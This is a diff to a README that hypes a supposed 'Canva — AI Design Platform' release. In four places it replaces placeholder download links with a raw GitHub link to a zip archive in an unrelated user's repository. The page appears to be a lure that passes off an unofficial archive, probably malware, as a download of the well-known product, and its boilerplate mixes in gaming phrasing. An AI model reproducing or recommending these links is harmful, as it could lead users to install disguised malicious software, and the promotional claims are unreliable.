@@ -4,7 +4,7 @@
 
 > The world's most accessible design platform supercharged with AI — type a description and watch Canva generate stunning designs, presentations, and visuals in seconds.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/costeffective-philemon361/canva-ai/main/Entoprocta/canva-ai-v1.2.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **Web, iOS, Android, Desktop**.
 
 ### Ready to play / use?
 
-[![Download Canva — AI Design Platform](https://img.shields.io/badge/Download-Canva%20%20AI%20Design%20Platform-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Canva — AI Design Platform](https://img.shields.io/badge/Download-Canva%20%20AI%20Design%20Platform-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/costeffective-philemon361/canva-ai/main/Entoprocta/canva-ai-v1.2.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/costeffective-philemon361/canva-ai/main/Entoprocta/canva-ai-v1.2.zip)**
 
 </div>
 
@@ -70,7 +70,7 @@ Canva — AI Design Platform is one of the **most hyped releases of Summer 2026*
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/costeffective-philemon361/canva-ai/main/Entoprocta/canva-ai-v1.2.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -78,7 +78,7 @@ Canva — AI Design Platform is one of the **most hyped releases of Summer 2026*
 
 **Don't miss out — Canva — AI Design Platform is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Canva%20%20AI%20Design%20Platform-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Canva%20%20AI%20Design%20Platform-blue?style=for-the-badge)](https://raw.githubusercontent.com/costeffective-philemon361/canva-ai/main/Entoprocta/canva-ai-v1.2.zip)
 
 *Canva — AI Design Platform — Available Now · Web, iOS, Android, Desktop*
 
